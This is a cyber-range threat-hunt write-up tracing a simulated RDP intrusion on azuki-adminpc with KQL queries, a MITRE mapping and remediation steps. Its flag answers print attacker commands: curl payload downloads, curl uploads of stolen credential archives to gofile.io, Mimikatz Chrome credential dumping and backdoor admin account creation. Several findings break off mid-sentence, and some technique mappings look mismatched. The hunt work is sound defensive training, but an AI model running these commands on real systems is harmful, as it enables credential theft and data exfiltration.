# 🚩 Virtual Machine Compromise (Bridge Take Over)

<!-- cover image: upload to the PR and paste the <img> line here -->

**Sandbox Contributor:** [Cyber Range AZURE LAW by Josh Madakor's team](https://www.skool.com/cyber-community)  
**Hunt Design Master:** <!-- Hunt Design Master name -->  
**Loyal Wingbot:** [MixLocalAgentic_SOC_Analyst](https://github.com/Panbear1983/Multi-Funtion_SOC_Agent_Research/tree/main/openAI_Agentic_SOC_Analyst)

<hr style="height: 4px; background-color: grey; border: none; margin-top: 40px;">

## 📏 Perimeters
Date Completed: ***2026-09-05***    
Simulated Environment: `Cyber Range AZURE LAW`  
Primary Impacted Host: `azuki-adminpc`  
Incident Date Range: ***11/25/2025 to 2025-11-25***  
Hunt Link: [Cyber Range SOC - AZUKI-TRADING - BRIDGE TAKEOVER](https://docs.google.com/forms/d/e/1FAIpQLSf5PNshNzWJbp54MlIRONDzf6wpFKlydHF-KN54_NLeX1n7Iw/viewform)  
Frameworks Applied: ***MITRE ATT&CK***, ***NIST 800-61***

<hr style="height: 4px; background-color: grey; border: none; margin-top: 40px;">

## 📄 Overview
<!-- DRAFT (AI-written from session facts) - review and edit before publishing -->
An attacker reached the administrative workstation azuki-adminpc on 25 November 2025 by moving laterally over RDP from 10.1.0.204, an address outside the host's own subnet, using the legitimate account yuki.tanaka. Once on the host, the attacker downloaded a 7-Zip archive disguised as a Windows security update from the public file host litter.catbox.moe, extracted it with a password into a cache folder under C:\Windows\Temp, and ran a Meterpreter implant that established command and control over a named pipe. Persistence was secured by creating a lookalike local account, yuki.tanaka2, and promoting it to the local Administrators group using Base64-encoded PowerShell. The attacker then enumerated sessions, domain trusts and network connections, hunted for KeePass password databases, stole browser and vault credentials, staged banking and contract documents in a hidden directory, and uploaded eight archives to the cloud storage service gofile.io.

The tradecraft was competent but not novel. Everything relied on living-off-the-land binaries already present on Windows — curl.exe, 7z.exe, qwinsta.exe, nltest.exe, NETSTAT.EXE, Robocopy.exe and tar.exe — combined with two publicly available offensive tools, Meterpreter and Mimikatz, the latter renamed to m.exe to blunt name-based detection. Blending in was the priority: the payload carried a plausible KB number, staging happened inside a legitimate-looking Crypto directory under ProgramData, the backdoor account mimicked the compromised user, and command lines were Base64-encoded. Exfiltration used ordinary HTTPS to a consumer file-sharing site, which would look unremarkable in proxy logs without content inspection.

<hr style="height: 4px; background-color: grey; border: none; margin-top: 40px;">

## 💠 Diamond Model Analysis
<!-- DRAFT (AI-written from session facts) - review and edit before publishing -->
| Feature | Details |
|---|---|
| **Adversary** | An unattributed, financially motivated actor operating hands-on-keyboard through RDP as yuki.tanaka, prioritising credential theft and rapid collection of banking and contract documents over stealth or long-term dwell. |
| **Infrastructure** | Staging from litter.catbox.moe (KB5044273-x64.7z and m-temp.7z), C2 via a local Meterpreter implant using the named pipe \Device\NamedPipe\msf-pipe-5902, exfiltration to gofile.io resolving to 45.112.123.227, and a pivot source at 10.1.0.204. |
| **Capability** | curl.exe for ingress and POST-based exfiltration, 7z.exe for password-protected archive extraction, meterpreter.exe for C2, Mimikatz renamed m.exe for DPAPI-based Chrome credential theft, Base64-encoded PowerShell for account creation and privilege escalation, and qwinsta.exe, nltest.exe, NETSTAT.EXE, Robocopy.exe and tar.exe for discovery, collection and packaging. |
| **Victim** | AZUKI-TRADING's administrative workstation azuki-adminpc and the yuki.tanaka user profile, specifically the Chrome credential store, the Azuki-Passwords.kdbx KeePass vault with its plaintext master password in KeePass-Master-Password.txt, and the Banking and Contracts document folders. |

<hr style="height: 4px; background-color: grey; border: none; margin-top: 40px;">

## 🥋 MITRE ATT&CK Table

| Stage | Flag | Tactic | Technique ID | Technique |
|---|---|---|---|---|
| Lateral Movement | 1 | Lateral Movement | **TBD** | TBD |
| Lateral Movement | 2 | Lateral Movement | **T1078** | Valid Accounts |
| Lateral Movement | 3 | Lateral Movement | **T1082** | System Information Discovery |
| Execution | 4 | Execution | **T1608.001** | Stage Capabilities |
| Execution | 5 | Execution | **T1105** | Ingress Tool Transfer |
| Execution | 6 | Execution | **T1140** | Deobfuscate/Decode Files |
| Persistence | 7 | Persistence | **T1059** | Command and Scripting Interpreter |
| Persistence | 8 | Persistence | **T1090.001** | Internal Proxy |
| Credential Access | 9 | Credential Access | **T1027** | Obfuscated Files or Information |
| Credential Access | 9 | Credential Access | **T1027** | Obfuscated Files or Information |
| Persistence | 10 | Persistence | **T1136.001** | Create Account: Local Account |
| Persistence | 11 | Persistence | **T1078.003** | Valid Accounts: Local Accounts |
| Persistence | 11 | Persistence | **T1027** | Obfuscated Files or Information |
| Discovery | 12 | Discovery | **T1033** | System Owner/User Discovery |
| Discovery | 13 | Discovery | **T1482** | Domain Trust Discovery |
| Discovery | 14 | Discovery | **T1049** | System Network Connections Discovery |
| Discovery | 15 | Discovery | **T1552.001** | Unsecured Credentials: Credentials In Files |
| Discovery | 16 | Discovery | **T1552.001** | Unsecured Credentials: Credentials In Files |
| Collection | 17 | Collection | **T1074.001** | Data Staged: Local Data Staging |
| Collection | 18 | Collection | **T1119** | Automated Collection |
| Collection | 19 | Collection | **T1560.001** | Archive Collected Data |
| Credential Access | 20 | Credential Access | **T1105** | Ingress Tool Transfer |
| Credential Access | 21 | Credential Access | **T1555.003** | Credentials from Web Browsers |
| Exfiltration | 22 | Exfiltration | **T1567** | Exfiltration Over Web Service |
| Exfiltration | 23 | Exfiltration | **T1567.002** | Exfiltration to Cloud Storage |
| Exfiltration | 24 | Exfiltration | **T1041** | Exfiltration Over C2 Channel |
| Credential Access | 25 | Credential Access | **T1555.005** | Credentials from Password Stores |

<hr style="height: 4px; background-color: grey; border: none; margin-top: 40px;">

## ⛨ Remediation Actions
<!-- DRAFT (AI-written from session facts) - review and edit before publishing -->
1. **Contain the compromised host and accounts**
   - Isolate azuki-adminpc from the network and reimage it rather than cleaning in place, given meterpreter.exe ran with administrative rights.
   - Disable the yuki.tanaka account, force a password reset, and delete the backdoor account yuki.tanaka2 along with its membership in the local Administrators group.

2. **Restrict remote access paths**
   - Block RDP from 10.1.0.204 and enforce a policy that administrative workstations only accept RDP from a defined jump-host subnet.
   - Require multi-factor authentication for all interactive and RemoteInteractive logons to administrative endpoints.

3. **Block payload staging and exfiltration channels**
   - Blocklist litter.catbox.moe, gofile.io and 45.112.123.227 at the proxy and firewall, and extend the block to consumer file-sharing categories generally.
   - Alert on any curl.exe execution using -L -o or -X POST -F file=@ on server and administrative endpoints.

4. **Harden execution in temporary and staging directories**
   - Apply application control rules that prevent execution from C:\Windows\Temp and C:\ProgramData subdirectories, which would have stopped meterpreter.exe.
   - Alert on 7z.exe extracting password-protected archives (-p switch) into system or temp paths.

5. **Detect obfuscated command execution and account changes**
   - Enable PowerShell script block and module logging, and alert on -EncodedCommand or Base64 strings that decode to net user or net localgroup.
   - Trigger a high-priority alert on any local account creation or Administrators group addition on endpoints, since neither should occur outside change control.

6. **Protect credential stores**
   - Remove KeePass-Master-Password.txt and any plaintext master passwords from user profiles, and rotate every credential held in Azuki-Passwords.kdbx.
   - Enforce Chrome policy to disable the built-in password manager on administrative workstations and alert on process access to Login Data outside of chrome.exe.

7. **Improve discovery and collection detection**
   - Build detections for the recon sequence qwinsta.exe, nltest.exe /domain_trusts /all_trusts and NETSTAT.EXE -ano running under one account in a short window.
   - Alert on Robocopy.exe or tar.exe operating against user Documents folders with a destination outside the user profile.

<hr style="height: 4px; background-color: grey; border: none; margin-top: 40px;">

## ✍️ Lessons Learned
<!-- DRAFT (AI-written from session facts) - review and edit before publishing -->
- **Valid credentials defeat perimeter controls:** the entire intrusion started with a legitimate account logging on over RDP, so no exploit or malware detection had a chance to fire at the entry point.
- **Subnet mismatch is a cheap, high-value signal:** logons to a 10.0.8.x host originating from 10.1.0.204 stood out immediately and should be an automatic alert rather than an analyst observation.
- **Living-off-the-land binaries carried most of the attack:** curl.exe, 7z.exe, nltest.exe, NETSTAT.EXE, Robocopy.exe and tar.exe are all signed Microsoft-shipped tools, so detection has to focus on command-line arguments rather than file reputation.
- **Naming is used as camouflage, not identity:** a payload called KB5044273-x64.7z, Mimikatz renamed to m.exe, a staging path under Microsoft\Crypto, and a backdoor account called yuki.tanaka2 all exploited an analyst's willingness to skim a familiar-looking name.
- **Encoding only delays analysis by minutes:** the Base64 PowerShell that created and elevated yuki.tanaka2 decoded to two plain net commands, so full command-line logging plus decoding turns obfuscation into a strong detection opportunity.
- **A plaintext master password destroys a password vault:** storing KeePass-Master-Password.txt beside Azuki-Passwords.kdbx meant a single tar command handed the attacker every credential the organisation held.

<hr style="height: 4px; background-color: grey; border: none; margin-top: 40px;">

## 🏔️ Conclusion
<!-- DRAFT (AI-written from session facts) - review and edit before publishing -->
The intrusion followed a clean, linear chain: RDP lateral movement from 10.1.0.204 using the valid account yuki.tanaka → landing on azuki-adminpc → curl.exe pulling a fake Windows update archive (KB5044273-x64.7z) from litter.catbox.moe → 7z.exe extracting the password-protected archive into C:\Windows\Temp\cache → meterpreter.exe executing and opening the named pipe \Device\NamedPipe\msf-pipe-5902 for C2 → Base64-obfuscated PowerShell creating the backdoor account yuki.tanaka2 and adding it to Administrators → discovery with qwinsta.exe, nltest.exe, NETSTAT.EXE and a recursive search for .kdbx files → credential theft using a second curl download (m-temp.7z) and Mimikatz renamed to m.exe against Chrome's Login Data → collection via Robocopy.exe into C:\ProgramData\Microsoft\Crypto\staging, producing 8 archives → exfiltration with curl.exe POST uploads to gofile.io at 45.112.123.227, including credentials.tar.gz containing the KeePass vault and KeePass-Master-Password.txt.

<hr style="height: 4px; background-color: grey; border: none; margin-top: 40px;">
<hr style="height: 4px; background-color: grey; border: none; margin-top: 40px;">

# 🎯 Capture The Flags

## 🕙 Timeline of Events

| **Timestamp (UTC)** | **Event** | **Target Device** | **Details** |
|---|---|---|---|
| **11/25/2025, 6:09:18.203 AM** | RDP pivot from foreign subnet | azuki-adminpc | `10.1.0.204` (Flag 1) |
| **11/25/2025, 6:09:18.203 AM** | Valid account yuki.tanaka reused | azuki-adminpc | `yuki.tanaka` (Flag 2) |
| **11/25/2025, 6:09:18.203 AM** | Admin workstation azuki-adminpc targeted | azuki-adminpc | `azuki-adminpc` (Flag 3) |
| **2025-11-25 04:41:52** | Payload staged on catbox host | rows | `litter.catbox.moe` (Flag 4) |
| **11/25/2025 ~** | Fake KB archive downloaded | Windows | `"curl.exe" -L -o C:\Windows\Temp\cache\KB5044273-x64.7z https://litter.catbox.mo` (Flag 5) |
| **11/25/2025 ~** | Password-protected archive extracted | Windows | `"7z.exe" x C:\Windows\Temp\cache\KB5044273-x64.7z -p******** -oC:\Windows\Temp\c` (Flag 6) |
| **11/25/2025 ~** | Meterpreter C2 implant deployed | rows | `meterpreter.exe` (Flag 7) |
| **11/25/2025 ~** | Named pipe C2 channel opened | Rows | `\\Device\\NamedPipe\\msf-pipe-5902` (Flag 8) |
| **2025-11-25 04:51:08** | Base64 account creation decoded | EncodedCommand | `net user yuki.tanaka2 B@ckd00r2024! /add` (Flag 9) |
| **11/25/2025 ~** | Lookalike backdoor account created | EncodedCommand | `yuki.tanaka2` (Flag 10) |
| **11/25/2025, 4:51:10.092 AM** | Backdoor added to Administrators | EncodedCommand | `net localgroup Administrators yuki.tanaka2 /add` (Flag 11) |
| **11/25/2025, 4:08:58.585 AM** | RDP session enumeration run | azuki-adminpc | `qwinsta.exe` (Flag 12) |
| **11/25/2025, 4:09:25.442 AM** | Domain trusts enumerated | azuki-adminpc | `"nltest.exe" /domain_trusts /all_trusts` (Flag 13) |
| **11/25/2025, 4:10:07.805 AM** | Network connections enumerated | azuki-adminpc | `"NETSTAT.EXE" -ano` (Flag 14) |
| **11/25/2025, 4:13:45.817 AM** | Recursive KeePass database search | azuki-adminpc | `"cmd.exe" /c where /r C:\Users *.kdbx` (Flag 15) |
| **11/25/2025, 4:15:57.398 AM** | Old password file discovered | azuki-adminpc | `OLD-Passwords.lnk` (Flag 16) |
| **2025-11-25 04:37:03** | Hidden staging directory created | azuki-adminpc | `C:\ProgramData\Microsoft\Crypto\staging` (Flag 17) |
| **11/25/2025, 4:37:03.007 AM** | Banking documents copied to staging | azuki-adminpc | `"Robocopy.exe" C:\Users\yuki.tanaka\Documents\Banking C:\ProgramData\Microsoft\C` (Flag 18) |
| **11/25/2025, 4:37:33.982 AM** | Eight archives assembled for exfil | azuki-adminpc | `8` (Flag 19) |
| **11/25/2025, 5:55:34.528 AM** | Credential theft tool downloaded | azuki-adminpc | `"curl.exe" -L -o m-temp.7z https://litter.catbox.moe/mt97cj.7z` (Flag 20) |
| **11/25/2025, 5:55:54.858 AM** | Chrome credential store dumped | Windows | `"m.exe" privilege::debug "dpapi::chrome /in:%localappdata%\Google\Chrome\User Da` (Flag 21) |
| **11/25/2025, 4:41:51.772 AM** | First archive uploaded externally | azuki-adminpc | `"curl.exe" -X POST -F file=@credentials.tar.gz https://store1.gofile.io/uploadFi` (Flag 22) |
| **11/25/2025 ~** | Exfiltration to gofile.io confirmed | azuki-adminpc | `gofile.io` (Flag 23) |
| **11/25/2025 ~** | Exfiltration server IP identified | azuki-adminpc | `45.112.123.227` (Flag 24) |
| **11/25/2025, 4:39:16.490 AM** | KeePass master password stolen | Azuki-Passwords | `KeePass-Master-Password.txt` (Flag 25) |

<hr style="height: 4px; background-color: grey; border: none; margin-top: 40px;">

## 🚩 Completed Flag Map

| Flag | Objective | Value |
|--------|---------------------------------------------|--------------------------------------------------|
| **1** | LATERAL MOVEMENT - Source System | 10.1.0.204 |
| **2** | LATERAL MOVEMENT - Compromised Credentials | yuki.tanaka |
| **3** | LATERAL MOVEMENT - Target Device | azuki-adminpc |
| **4** | EXECUTION - Payload Hosting Service | litter.catbox.moe |
| **5** | EXECUTION - Malware Download Command | "curl.exe" -L -o C:\Windows\Temp\cache\KB5044273-x64.7z https://litter.catbox.moe/gfdb9v.7z |
| **6** | EXECUTION - Archive Extraction Command | "7z.exe" x C:\Windows\Temp\cache\KB5044273-x64.7z -p******** -oC:\Windows\Temp\cache\ -y |
| **7** | PERSISTENCE - C2 Implant | meterpreter.exe |
| **8** | PERSISTENCE - Named Pipe | \\Device\\NamedPipe\\msf-pipe-5902 |
| **9** | CREDENTIAL ACCESS - Decoded Account Creation | net user yuki.tanaka2 B@ckd00r2024! /add |
| **10** | PERSISTENCE - Backdoor Account | yuki.tanaka2 |
| **11** | PERSISTENCE - Decoded Privilege Escalation Command | net localgroup Administrators yuki.tanaka2 /add |
| **12** | DISCOVERY - Session Enumeration | qwinsta.exe |
| **13** | DISCOVERY - Domain Trust Enumeration | "nltest.exe" /domain_trusts /all_trusts |
| **14** | DISCOVERY - Network Connection Enumeration | "NETSTAT.EXE" -ano |
| **15** | DISCOVERY - Password Database Search | "cmd.exe" /c where /r C:\Users *.kdbx |
| **16** | DISCOVERY - Credential File | OLD-Passwords.lnk |
| **17** | COLLECTION - Data Staging Directory | C:\ProgramData\Microsoft\Crypto\staging |
| **18** | COLLECTION - Automated Data Collection Command | "Robocopy.exe" C:\Users\yuki.tanaka\Documents\Banking C:\ProgramData\Microsoft\Crypto\staging\Banking /E /R:1 /W:1 /NP |
| **19** | COLLECTION - Exfiltration Volume | 8 |
| **20** | CREDENTIAL ACCESS - Credential Theft Tool Download | "curl.exe" -L -o m-temp.7z https://litter.catbox.moe/mt97cj.7z |
| **21** | CREDENTIAL ACCESS - Browser Credential Theft | "m.exe" privilege::debug "dpapi::chrome /in:%localappdata%\Google\Chrome\User Data\Default\Login Data /unprotect" exit |
| **22** | EXFILTRATION - Data Upload Command | "curl.exe" -X POST -F file=@credentials.tar.gz https://store1.gofile.io/uploadFile |
| **23** | EXFILTRATION - Cloud Storage Service | gofile.io |
| **24** | EXFILTRATION - Destination Server | 45.112.123.227 |
| **25** | CREDENTIAL ACCESS - Master Password Extraction | KeePass-Master-Password.txt |

<hr style="height: 4px; background-color: grey; border: none; margin-top: 40px;">

### 🚩 Flag 1: LATERAL MOVEMENT - Source System

**Objective:** Identify the source IP address for lateral movement to the admin PC?

**What to Hunt:** Attackers pivot from initially compromised systems to high-value targets. Identifying the source of lateral movement reveals the attack's progression and helps scope the full compromise.

**Hint 1:** Query DeviceLogonEvents for RemoteInteractive sessions.

**Hint 2:** The source IP belongs to the system compromised in CTF 1 - cross-reference with your network logins.

**Reference:** TBD

**KQL Query:**

```kql
DeviceLogonEvents
| where TimeGenerated between (datetime(2025-11-24) .. datetime(2026-03-13))
| where DeviceName contains "azuki"
| where RemoteIP != '' and RemoteIP != '-'
| where LogonType == 'RemoteInteractive'
| order by TimeGenerated
```

**Output:** `10.1.0.204`  
**Finding:** The repeated logons from “10.1.0.204” to “azuki-adminpc” (a device name containing "azuki") strongly indicate lateral movement from this IP. The subnet mismatch (10.1.x.x vs. 10.0.8.x) further supports this as an external pivot point. No conflicting or ambiguous data exists in the provided results.
<!-- screenshot: upload to the GitHub PR and paste the <img> line here -->

---

### 🚩 Flag 2: LATERAL MOVEMENT - Compromised Credentials

**Objective:** Identify the compromised account used for lateral movement?

**What to Hunt:** Understanding which accounts attackers use for lateral movement determines the blast radius and guides credential reset priorities.

**Hint 1:** Examine the AccountName field in RemoteInteractive logon events on Azuki systems.

**Hint 2:** This account was compromised during the initial breach and reused for lateral movement.

**Reference:** Valid Accounts (T1078)

**KQL Query:**

```kql
DeviceLogonEvents
| where TimeGenerated between (datetime(2025-11-24) .. datetime(2026-03-13))
| where DeviceName contains "azuki"
| where RemoteIP == '10.1.0.204'
| where LogonType == 'RemoteInteractive'
| project TimeGenerated, DeviceName, AccountName, RemoteIP, LogonType
| order by TimeGenerated
```

**Output:** `yuki.tanaka`  
**Finding:** The logs show four RemoteInteractive logon events to device 'azuki-adminpc' from IP 10.1.0.204 (Flag 1) using the same AccountName 'yuki.tanaka'. This indicates the attacker is using this account for lateral movement across the network. The consistent AccountName across multiple logons confirms it as the primary attack vector.
<!-- screenshot: upload to the GitHub PR and paste the <img> line here -->

---

### 🚩 Flag 3: LATERAL MOVEMENT - Target Device

**Objective:** What is the target device name?

**What to Hunt:** Attackers select high-value targets based on user roles and data access. Identifying the compromised device reveals what information was at risk.

**Hint 1:** Check the DeviceName field in logon events from the source IP.

**Hint 2:** The device naming convention suggests this is an administrative or executive workstation.

**Reference:** System Information Discovery (T1082)

**KQL Query:**

```kql
DeviceLogonEvents
| where TimeGenerated between (datetime(2025-11-24) .. datetime(2026-03-13))
| where DeviceName contains "azuki"
| where RemoteIP == '10.1.0.204'
| where LogonType == 'RemoteInteractive'
| project TimeGenerated, DeviceName, AccountName, RemoteIP, LogonType
| order by TimeGenerated
```

**Output:** `azuki-adminpc`  
**Finding:** This device name correlates with previous flags (Flag 1: 10.1.0.204, Flag 2: yuki.tanaka) as part of the same network/session context. The account yuki.tanaka is associated with remote logons to this device. The KQL query explicitly filters for DeviceName containing 'azuki' and all four log entries show 'azuki-adminpc' as the DeviceName. This matches the objective of finding the target device name. No decoding/parsing was required as the DeviceName field is already clear text.
<!-- screenshot: upload to the GitHub PR and paste the <img> line here -->

---

### 🚩 Flag 4: EXECUTION - Payload Hosting Service

**Objective:** What file hosting service was used to stage malware?

**What to Hunt:** Attackers rotate infrastructure between operations to evade network blocks and threat intelligence feeds. Documenting new domains is critical for prevention.

**Hint 1:** Search DeviceNetworkEvents for connections to external file hosting services during the malware download phase.

**Hint 2:** This hosting service differs from the one used in CTF 2 - attackers rotate infrastructure.

**Reference:** Stage Capabilities (T1608.001)

**KQL Query:**

```kql
DeviceNetworkEvents
| where TimeGenerated between (datetime(2025-11-24) .. datetime(2026-11-25))
| where DeviceName contains "azuki-adminpc"
| where RemoteUrl != ''
| where InitiatingProcessFileName has_any ("powershell.exe","cmd.exe","mshta.exe","wscript.exe","cscript.exe","rundll32.exe","bitsadmin.exe","certutil.exe","curl.exe","wget.exe","python.exe")
| project TimeGenerated, RemoteUrl, InitiatingProcessFileName
| order by TimeGenerated
```

**Output:** `litter.catbox.moe`  
**Finding:** reasonable based on catbox's known abuse pattern for malware staging, but still not fully proven from the 5 rows alone since no file-write correlation was in the query results. If you want to lock this to High confidence, pulling DeviceFileEvents on azuki-adminpc for the 04:15–04:45 UTC window would show which download was immediately followed by a new file on disk.
<!-- screenshot: upload to the GitHub PR and paste the <img> line here -->

---

### 🚩 Flag 5: EXECUTION - Malware Download Command

**Objective:** What command was used to download the malicious archive?

**What to Hunt:** Command-line download utilities provide flexible, scriptable malware delivery while blending with legitimate administrative activity.

**Hint 1:** Search DeviceProcessEvents for command-line utilities capable of retrieving remote files.

**Hint 2:** The downloaded file masquerades as a Windows security update (KB format).

**Reference:** Ingress Tool Transfer (T1105)

**KQL Query:**

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-11-24) .. datetime(2026-11-25))
| where DeviceName contains "azuki-adminpc"
| where ProcessCommandLine has_any ("litter.catbox.moe")
| project TimeGenerated, ProcessCommandLine
| order by TimeGenerated
```

**Output:** `"curl.exe" -L -o C:\Windows\Temp\cache\KB5044273-x64.7z https://litter.catbox.moe/gfdb9v.7z`  
**Finding:** The flag question seeks the exact command-line instruction used to download a malicious archive disguised as a Windows security update (KB format). The query results reveal two `curl.exe` commands downloading `.7z` files from `litter.catbox.moe`, a known hosting service for malicious payloads. The filenames `KB5044273-x64.7z` and `mt97cj.7z` align with the KB format and suspicious archive patterns. The second command explicitly uses a KB-named file, matching the context of a security update mimic.
<!-- screenshot: upload to the GitHub PR and paste the <img> line here -->

---

### 🚩 Flag 6: EXECUTION - Archive Extraction Command

**Objective:** Identify the command used to extract the password-protected archive?

**What to Hunt:** Password-protected archives evade basic content inspection while legitimate compression tools bypass application whitelisting controls.

**Hint 1:** Look for compression tool executions that extract files from the downloaded archive.

**Hint 2:** The command includes a password parameter and extracts to the same cache directory.

**Reference:** Deobfuscate/Decode Files (T1140)

**KQL Query:**

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-11-24) .. datetime(2026-11-25))
| where DeviceName contains "azuki-adminpc"
| where ProcessCommandLine has_any (".7z")
| project TimeGenerated, FileName, ProcessCommandLine, InitiatingProcessCommandLine, InitiatingProcessAccountName
| order by TimeGenerated asc
```

**Output:** `"7z.exe" x C:\Windows\Temp\cache\KB5044273-x64.7z -p******** -oC:\Windows\Temp\cache\ -y`  
**Finding:** The flag question requires identifying the exact command-line used to extract a password-protected archive. The critical clues are:
<!-- screenshot: upload to the GitHub PR and paste the <img> line here -->

---

### 🚩 Flag 7: PERSISTENCE - C2 Implant

**Objective:** Identify the C2 beacon filename?

**What to Hunt:** Command and control implants maintain persistent access and enable remote control of compromised systems. The implant filename often mimics legitimate processes.

**Hint 1:** Examine file creations in the cache directory following archive extraction.

**Hint 2:** The filename references offensive security tooling.

**Reference:** Command and Scripting Interpreter (T1059)

**KQL Query:**

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-11-24) .. datetime(2026-11-25))
| where DeviceName contains "azuki-adminpc"
| where FolderPath contains 'cache'
| project TimeGenerated, FileName, ProcessCommandLine, InitiatingProcessCommandLine
| order by TimeGenerated asc
```

**Output:** `meterpreter.exe`  
**Finding:** The flag question seeks the filename of a C2 beacon, a persistent backdoor tool often hidden in cache directories after archive extraction. The query results show multiple files, but the key is to focus on:
<!-- screenshot: upload to the GitHub PR and paste the <img> line here -->

---

### 🚩 Flag 8: PERSISTENCE - Named Pipe

**Objective:** Identify the named pipe created by the C2 implant?

**What to Hunt:** Named pipes enable inter-process communication for C2 frameworks. Pipes follow distinctive naming patterns that serve as behavioural indicators.

**Hint 1:** Query DeviceEvents for NamedPipeEvent actions occurring shortly after the C2 implant execution.

**Hint 2:** Parse the AdditionalFields JSON to extract the PipeName.

**Reference:** Internal Proxy (T1090.001)

**KQL Query:**

```kql
DeviceEvents
| where TimeGenerated between (datetime(2025-11-24) .. datetime(2026-11-25))
| where DeviceName contains "azuki-adminpc"
| where ActionType contains 'pipe'
| where InitiatingProcessFileName contains 'meterpreter.exe'
| project TimeGenerated, DeviceName, ActionType, AdditionalFields, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessAccountName
```

**Output:** `\\Device\\NamedPipe\\msf-pipe-5902`  
**Finding:** The flag question specifically asks for the named pipe created by the C2 implant. The **AdditionalFields** column in the query results contains the `PipeName` field, which directly answers the question. Both rows reference named pipes created by `meterpreter.exe`, which is the C2 implant (as confirmed in Flag 7). However, the **first row** (`\\Device\\NamedPipe\\msf-pipe-5902`) is associated with an earlier timestamp (04:24:35) and aligns with the timeline of the C2 implant's activity (e.g., after `meterpreter.exe` execution). The second row (`\\Device\\NamedPipe\\msf-pipe-5722`) is later (05:36:54) but still falls within the same operational window.
<!-- screenshot: upload to the GitHub PR and paste the <img> line here -->

---

### 🚩 Flag 9: CREDENTIAL ACCESS - Decoded Account Creation

**Objective:** What is the decoded Base64 command?

**What to Hunt:** Base64 encoding obfuscates malicious commands from basic string matching and log analysis. Decoding reveals the true intent.

**Hint 1:** Search DeviceProcessEvents for PowerShell executions with obfuscated or encoded input.

**Hint 2:** Decode the payload to reveal the account creation command hidden within.

**Reference:** Obfuscated Files or Information (T1027), Obfuscated Files or Information (T1027)

**KQL Query:**

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-11-24) .. datetime(2026-11-25))
| where DeviceName contains "azuki-adminpc"
| where ProcessCommandLine contains "-enc"
| project TimeGenerated, ProcessCommandLine, FileName, SHA256
```

**Output:** `net user yuki.tanaka2 B@ckd00r2024! /add`  
**Finding:** The account name yuki.tanaka2 is a variant/lookalike of the
<!-- screenshot: upload to the GitHub PR and paste the <img> line here -->

---

### 🚩 Flag 10: PERSISTENCE - Backdoor Account

**Objective:** Identify the backdoor account name?

**What to Hunt:** Hidden administrator accounts provide alternative access if primary persistence mechanisms are discovered and removed.

**Hint 1:** Decode the Base64 command from FLAG 9 - what username is being created?

**Hint 2:** The account name follows a pattern similar to legitimate user accounts to avoid suspicion.

**Reference:** Create Account: Local Account (T1136.001)

**KQL Query:**

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-11-24) .. datetime(2026-11-25))
| where DeviceName contains "azuki-adminpc"
| where ProcessCommandLine contains "-enc"
| project ProcessCommandLine
```

**Output:** `yuki.tanaka2`  
**Finding:** Row 3's Base64 decodes to: "net localgroup Administrators yuki.tanaka2 /add" — this immediately grants
<!-- screenshot: upload to the GitHub PR and paste the <img> line here -->

---

### 🚩 Flag 11: PERSISTENCE - Decoded Privilege Escalation Command

**Objective:** What is the decoded Base64 command for privilege escalation?

**What to Hunt:** Base64 encoding obfuscates malicious commands from basic string matching and log analysis. Decoding reveals the true intent.

**Hint 1:** Search DeviceProcessEvents for PowerShell executions with encoded commands.

**Hint 2:** Decode the payload to reveal how the attacker elevated the backdoor account's privileges.

**Reference:** Valid Accounts: Local Accounts (T1078.003), Obfuscated Files or Information (T1027), Obfuscated Files or Information (T1027)

**KQL Query:**

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-11-24) .. datetime(2026-11-25))
| where AccountName contains "yuki.tanaka"
| where ProcessCommandLine contains "yuki.tanaka2"
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessCommandLine
```

**Output:** `net localgroup Administrators yuki.tanaka2 /add`  
**Finding:** Look in InitiatingProcessCommandLine for powershell.exe
<!-- screenshot: upload to the GitHub PR and paste the <img> line here -->

---

### 🚩 Flag 12: DISCOVERY - Session Enumeration

**Objective:** What command was used to enumerate RDP sessions?

**What to Hunt:** Terminal services enumeration reveals active user sessions, helping attackers identify high-value targets and avoid detection.

**Hint 1:** Look for commands that enumerate active Remote Desktop sessions.

**Hint 2:** Administrators often use shorthand commands - attackers do too.

**Reference:** System Owner/User Discovery (T1033)

**KQL Query:**

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-11-24) .. datetime(2026-11-25))
| where AccountName contains "yuki.tanaka"
| where AccountDomain contains 'Admin'
| where ProcessCommandLine contains "RDP"
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessCommandLine
| order by TimeGenerated
```

**Output:** `qwinsta.exe`  
**Finding:** Re-run the query without restricting to ProcessCommandLine contains "RDP" literally — that filter is pulling in unrelated Edge WebView2
<!-- screenshot: upload to the GitHub PR and paste the <img> line here -->

---

### 🚩 Flag 13: DISCOVERY - Domain Trust Enumeration

**Objective:** Identify the command used to enumerate domain trusts?

**What to Hunt:** Domain trust relationships reveal paths for lateral movement across organisational boundaries and potential targets in connected forests.

**Hint 1:** Search for executions that query domain trust information.

**Hint 2:** The command includes parameters to show all trust types, not just direct trusts.

**Reference:** Domain Trust Discovery (T1482)

**KQL Query:**

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-11-24) .. datetime(2026-11-25))
| where AccountName contains "yuki.tanaka"
| where AccountDomain contains 'Admin'
| where ProcessCommandLine contains "nltest.exe"
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessCommandLine
```

**Output:** `"nltest.exe" /domain_trusts /all_trusts`  
**Finding:** Both rows show FileName nltest.exe executed with ProcessCommandLine "nltest.exe" /domain_trusts /all_trusts, run by account yuki.tanaka,
<!-- screenshot: upload to the GitHub PR and paste the <img> line here -->

---

### 🚩 Flag 14: DISCOVERY - Network Connection Enumeration

**Objective:** What command was used to enumerate network connections?

**What to Hunt:** Network connection enumeration identifies active sessions, listening services, and potential lateral movement targets.

**Hint 1:** Look for native Windows utilities that display active network connections.

**Hint 2:** The attacker needed to identify which processes owned each connection.

**Reference:** System Network Connections Discovery (T1049)

**KQL Query:**

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-11-24) .. datetime(2026-11-25))
| where AccountName contains "yuki.tanaka"
| where ProcessCommandLine contains "netstat"
